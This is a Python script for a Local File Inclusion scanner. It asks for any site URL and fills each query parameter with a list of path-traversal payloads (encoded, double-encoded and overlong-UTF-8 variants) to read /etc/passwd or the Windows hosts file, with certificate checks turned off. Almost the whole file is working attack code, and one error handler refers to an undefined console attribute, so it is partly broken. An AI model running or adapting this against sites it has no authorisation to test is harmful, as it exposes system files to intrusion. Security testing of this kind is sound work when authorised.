import re
import requests
import urllib.parse
from rich.console import Console
from rich.progress import Progress
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class LFIChecker:
    def __init__(self, url, depth=10, silent=False):
        self.url = self.ensure_correct_protocol(url)
        self.depth = depth
        self.silent = silent
        self.LFI_TEST_FILES = [
            ('/etc/passwd', re.compile(r'root:(.*):\d+:\d+:')),
            ('/Windows/System32/drivers/etc/hosts', re.compile(r'127\.0\.0\.1\s+localhost'))
        ]
        self.LFI_PAYLOADS = [
            '../',  # Original
            '....//',  # Double dot slash
            '..///////..////..//////',  # Excessive slash
            '/%5C..',  # URL encoded backslash
            '/var/www/../../',  # Maintain initial path
            '....\\/',  # Double dot backslash (Windows)
            '%5c..%5c',  # URL encoded
            '%c0%af',  # Overlong UTF-8 Unicode encoding
            '..%252f',  # Double encoding
            '%252e%252e%252f'  # Double encoding with dot
        ]

    def ensure_correct_protocol(self, url):
        if not url.startswith(('http://', 'https://')):
            try:
                requests.get('https://' + url, timeout=3, verify=False)
                return 'https://' + url
            except requests.exceptions.RequestException:
                try:
                    requests.get('http://' + url, timeout=3, verify=False)
                    return 'http://' + url
                except requests.exceptions.RequestException:
                    pass
        return url
    
    def path_traversal_checker(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = []

        for file_path, _ in self.LFI_TEST_FILES:
            for i in range(self.depth):
                for payload in self.LFI_PAYLOADS:
                    file_paths.append((payload * i + file_path, _))
                    file_paths.append((urllib.parse.quote(payload * i + file_path), _))

        console = Console()
        total_operations = len(params.keys()) * len(file_paths)

        if not self.silent:
            with Progress(console=console) as progress:
                return self._scan(params, file_paths, parsed_url, console, total_operations, progress)

        return self._scan(params, file_paths, parsed_url, console)

    def _scan(self, params, file_paths, parsed_url, console, total_operations=None, progress=None):
        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None

        for param_name in params.keys():
            for file_path, file_regex in file_paths:
                new_params = params.copy()
                new_params[param_name] = file_path
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                try:
                    response = requests.get(fuzzed_url, verify=False)
                except requests.exceptions.ConnectionError:
                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
                    return False    

                if file_regex.search(response.text):
                    if not self.silent:
                        console.print(f'[bold red]Possible LFI detected at {fuzzed_url}[/bold red]', style='bold red')
                    return True
                
                if progress:
                    progress.update(task, advance=1)

        return False

def main():
    url = input('Enter site URL to test: ')
    checker = LFIChecker(url, silent=False)
    result = checker.path_traversal_checker()
    print(f"LFI detected: {result}")

if __name__ == "__main__":
    main()
